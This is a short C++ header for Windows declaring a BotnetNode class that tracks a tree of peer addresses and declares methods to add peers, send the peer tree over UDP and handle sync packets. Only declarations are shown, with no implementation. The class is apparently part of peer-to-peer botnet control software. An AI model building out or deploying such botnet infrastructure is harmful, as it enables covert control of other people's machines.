#pragma once

#include "network.h"

#include <vector>
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

typedef struct
{
	adr host;
	size_t n_branches;
} tree_ext;

class BotnetNode
{
private:
	adr _adr;
	std::vector<BotnetNode*> _branches;

	void sendNetTree(
		const SOCKET& udp_sock,
		const struct sockaddr_in& peer_addr,
		std::vector<adr>& hosts,
		char* const buf
	);

	BotnetNode* findNode(
		const adr& addr,
		std::vector<adr>& hosts
	);

public:

	BotnetNode();

	BotnetNode(
		uint32_t ip, 
		uint16_t port
	);

	void addPeer(
		const struct botnet_pack& pack, 
		const SOCKET& udp_sock
	);


	void handleSync(
		const u_char* pack
	);

};
